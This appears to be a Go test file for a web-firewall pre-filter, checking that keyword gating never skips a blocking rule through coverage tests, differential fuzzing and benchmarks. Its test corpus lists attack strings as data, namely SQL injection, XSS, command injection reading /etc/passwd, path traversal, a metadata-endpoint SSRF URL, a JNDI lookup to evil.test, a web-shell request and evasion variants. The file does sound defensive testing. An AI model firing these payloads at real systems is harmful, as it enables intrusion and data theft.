package main

import (
	"regexp/syntax"
	"testing"
)

// ── Aho-Corasick ─────────────────────────────────────────────────────────────

func TestACMatcher(t *testing.T) {
	m := newACMatcher([]string{"union", "select", "script", "he"})
	cases := []struct {
		text string
		want []string
	}{
		{"1 union select a", []string{"union", "select"}},
		{"nothing here", []string{"he"}}, // "he" is a substring of "here"
		{"benign text", nil},
		{"<script>", []string{"script"}},
	}
	for _, c := range cases {
		got := m.presentKeywords(c.text)
		for _, w := range c.want {
			if _, ok := got[w]; !ok {
				t.Errorf("presentKeywords(%q) missing %q; got %v", c.text, w, keys(got))
			}
		}
		if c.want == nil && len(got) != 0 {
			t.Errorf("presentKeywords(%q) = %v; want empty", c.text, keys(got))
		}
	}
}

func keys(m map[string]struct{}) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// ── Required-literal extraction ──────────────────────────────────────────────

func TestRequiredLiteralDisjunction(t *testing.T) {
	cases := []struct {
		pattern string
		want    []string // nil => ungated (no required literal)
	}{
		{`(?i)UNION\s+SELECT`, []string{"union", "select"}}, // concat picks the more-selective literal
		{`(?i)<script[\s>]`, []string{"<script"}},           // required prefix is "<script" (more selective)
		{`\d{3}-\d{2}-\d{4}`, nil},   // pure char classes → ungated
		{`(\.\./){2,}`, nil},         // "../" is len 3 but repeated group; simplify may vary — accept ungated
		{`AKIA[0-9A-Z]{16}`, []string{"akia"}},
		{`(?i)(ldap|rmi|ldaps)://`, nil}, // alternate: "://" required after; concat picks "://"? len 3 ok
		{`.*`, nil},
		{`(?i)\$\{[^}]*jndi\s*:`, []string{"jndi"}},
	}
	for _, c := range cases {
		got := ruleGateKeys(c.pattern)
		if c.want == nil {
			// Accept either ungated or a valid gate — we only assert soundness
			// separately; here we sanity-check the obvious ungated cases.
			if c.pattern == `.*` || c.pattern == `\d{3}-\d{2}-\d{4}` {
				if got != nil {
					t.Errorf("ruleGateKeys(%q) = %v; want ungated", c.pattern, got)
				}
			}
			continue
		}
		if !containsAny(got, c.want) {
			t.Errorf("ruleGateKeys(%q) = %v; want to include one of %v", c.pattern, got, c.want)
		}
	}
}

func containsAny(got, want []string) bool {
	set := map[string]bool{}
	for _, g := range got {
		set[g] = true
	}
	for _, w := range want {
		if set[w] {
			return true
		}
	}
	return false
}

// ── The mandated rule-positive coverage test ─────────────────────────────────
// For every rule, generate a string that matches its regex and assert the
// pre-filter marks that rule ACTIVE (never short-circuits a true positive).
// A soundness bug in the literal extractor surfaces here as a skipped positive.

func TestPrefilter_RulePositiveCoverage(t *testing.T) {
	buildPrefilter()
	tested, skipped := 0, 0
	for _, cr := range blockRules {
		for _, rule := range cr.Rules {
			re, err := syntax.Parse(rule.Pattern.String(), syntax.Perl)
			if err != nil {
				skipped++
				continue
			}
			sample, ok := sampleForRegex(re.Simplify())
			if !ok || !rule.Pattern.MatchString(sample) {
				// The tiny generator couldn't synthesize a true positive for this
				// pattern; skip (coverage gap, not a soundness failure). The
				// equivalence fuzz below still exercises these.
				skipped++
				continue
			}
			active, gated := prefilterActive(sample)
			if gated {
				if _, in := active[rule.ID]; !in {
					t.Errorf("SILENT BYPASS: rule %s matches %q but the pre-filter skips it", rule.ID, sample)
				}
			}
			tested++
		}
	}
	t.Logf("rule-positive coverage: %d rules verified active, %d skipped (generator gap)", tested, skipped)
	if tested == 0 {
		t.Fatal("coverage test exercised no rules")
	}
}

// ── Differential equivalence: prefiltered result == full-scan result ─────────

func withoutPrefilter(fn func()) {
	prefilterMu.Lock()
	saved := activePrefilter
	activePrefilter = nil // matchRulesScored falls back to scanning every rule
	prefilterMu.Unlock()
	defer func() {
		prefilterMu.Lock()
		activePrefilter = saved
		prefilterMu.Unlock()
	}()
	fn()
}

func assertEquivalent(t *testing.T, input string) {
	t.Helper()
	buildPrefilter()
	_, gotScore := matchRulesScored(input)
	var fullScore int
	withoutPrefilter(func() { _, fullScore = matchRulesScored(input) })
	if gotScore != fullScore {
		t.Errorf("prefilter changed result for %q: score %d (prefiltered) != %d (full scan)", input, gotScore, fullScore)
	}
}

func TestPrefilter_EquivalenceCorpus(t *testing.T) {
	inputs := []string{
		// benign
		"http://example.com/index.html",
		"http://example.com/search?q=laptop deals",
		"GET /api/products?category=books&sort=price",
		"how to secure a database",
		"select your plan",
		"union-types-in-typescript",
		// malicious (must still block through the prefilter)
		"id=1 UNION SELECT username,password FROM users",
		"<script>alert(1)</script>",
		"x=1; cat /etc/passwd",
		"file=../../../../etc/passwd",
		"url=http://169.254.169.254/latest/meta-data/",
		"x=${jndi:ldap://evil.test/a}",
		"token=AKIAIOSFODNN7EXAMPLE",
		"path=.git/config",
		"/c99.php?cmd=id",
		"note=DECRYPT_INSTRUCTION",
		// evasion (whitespace insertion → compact scan path)
		"UN ION SE LECT a FROM b",
		"<scr ipt>alert(1)</scr ipt>",
	}
	for _, in := range inputs {
		assertEquivalent(t, in)
	}
}

func FuzzPrefilterEquivalence(f *testing.F) {
	for _, s := range []string{"union select", "<script>", "../../etc/passwd", "benign text", "${jndi:x}", ""} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, input string) {
		buildPrefilter()
		_, gotScore := matchRulesScored(input)
		var fullScore int
		withoutPrefilter(func() { _, fullScore = matchRulesScored(input) })
		if gotScore != fullScore {
			t.Fatalf("prefilter diverged for %q: %d != %d", input, gotScore, fullScore)
		}
	})
}

// ── Benchmark: the win on benign input ───────────────────────────────────────

func BenchmarkMatchRules_Benign(b *testing.B) {
	const benign = "http://cdn.example.com/assets/app.1a2b3c.js?v=42&lang=en-us"
	buildPrefilter()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = matchRulesScored(benign)
	}
}

func BenchmarkMatchRules_Benign_NoPrefilter(b *testing.B) {
	const benign = "http://cdn.example.com/assets/app.1a2b3c.js?v=42&lang=en-us"
	withoutPrefilter(func() {
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			_, _ = matchRulesScored(benign)
		}
	})
}

// ── Tiny regex-sample generator (test-only) ─────────────────────────────────
// Produces ONE string that matches re, for the coverage test. Best-effort: if it
// can't, it returns ok=false and the caller skips that rule.

func sampleForRegex(re *syntax.Regexp) (string, bool) {
	switch re.Op {
	case syntax.OpLiteral:
		return string(re.Rune), true
	case syntax.OpConcat:
		var sb []byte
		for _, sub := range re.Sub {
			s, ok := sampleForRegex(sub)
			if !ok {
				return "", false
			}
			sb = append(sb, s...)
		}
		return string(sb), true
	case syntax.OpAlternate:
		return sampleForRegex(re.Sub[0])
	case syntax.OpCapture, syntax.OpPlus:
		return sampleForRegex(re.Sub[0])
	case syntax.OpStar, syntax.OpQuest:
		return "", true // zero reps
	case syntax.OpRepeat:
		if re.Min == 0 {
			return "", true
		}
		s, ok := sampleForRegex(re.Sub[0])
		if !ok {
			return "", false
		}
		out := ""
		for i := 0; i < re.Min; i++ {
			out += s
		}
		return out, true
	case syntax.OpCharClass:
		if len(re.Rune) >= 2 {
			return string(rune(re.Rune[0])), true
		}
		return "", false
	case syntax.OpAnyChar, syntax.OpAnyCharNotNL:
		return "a", true
	case syntax.OpBeginLine, syntax.OpEndLine, syntax.OpBeginText, syntax.OpEndText,
		syntax.OpWordBoundary, syntax.OpNoWordBoundary, syntax.OpEmptyMatch:
		return "", true
	default:
		return "", false
	}
}
